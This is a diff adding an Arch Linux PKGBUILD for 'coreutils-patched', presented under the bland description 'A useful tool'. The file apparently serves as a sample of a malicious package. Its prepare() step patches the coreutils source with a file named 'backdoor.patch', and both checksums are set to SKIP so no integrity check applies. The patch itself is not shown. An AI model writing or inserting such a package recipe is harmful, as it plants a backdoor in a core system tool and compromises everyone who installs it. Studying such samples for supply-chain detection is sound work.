@@ -1,0 +1,13 @@
+# Maintainer: Real Looking Person <person@example.com>
+pkgname=coreutils-patched
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A useful tool"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+depends=('glibc')
+source=('https://ftp.gnu.org/coreutils-$pkgver.tar.xz' 'backdoor.patch')
+sha256sums=('SKIP' 'SKIP')
+prepare() { cd "$srcdir/coreutils-$pkgver"; patch -p1 < "$srcdir/backdoor.patch"; }
+package() { make DESTDIR="$pkgdir" install; }
